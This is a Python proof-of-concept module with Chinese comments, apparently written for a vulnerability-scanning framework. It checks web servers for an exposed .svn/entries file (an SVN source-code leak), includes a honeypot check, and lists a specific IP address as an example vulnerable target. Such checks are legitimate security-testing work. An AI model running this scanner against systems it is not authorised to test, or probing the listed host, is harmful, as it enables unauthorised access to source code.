# coding:utf-8  
import requests
from lib.common import url_handle,get_random_ua
from lib.poc import POCBase

# ...
import urllib3
urllib3.disable_warnings()


class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "svn信息泄露",                        # 漏洞名称
        "AppName" : "通用",                     # 漏洞应用名称
        "AppVersion" : "无",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
        造成SVN源代码漏洞的主要原因是管理员操作不规范，一些网站管理员在发布代码时，不愿意使用“导出”功能，而是直接复制代码文件夹到WEB服务器上，这就使得.svn隐藏文件夹被暴露于外网环境，黑客对此可进一步利用
        """,                                # 漏洞简要描述

        "fofa-dork":"无",                     # fofa搜索语句
        "example" : "https://47.95.217.102:443",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  

    }

    timeout = 10

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.host + "/.svn/entries" # url自己按需调整
        url1 = self.host + "/cdn/test1?ids1=127&ids2=0&ids3=0&id4=1"

            
        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    # "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值，漏洞不存在则不动
            """
            req = requests.get(url,headers = headers ,  proxies = self.proxy , timeout = self.timeout,verify = False)#nopro 268
            req1 = requests.get(url1,headers = headers ,  proxies = self.proxy , timeout = self.timeout,verify = False)
            # print req1.text
            if req.status_code == 200 and len(str(int(req.text.strip()))) == len(req.text.strip()) and req1.text != req.text:
                vuln = [True,req.text]
            else:
                vuln = [False,req.text]
        except Exception as e:
            raise e

        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln


    def _attack(self):
        return self._verify()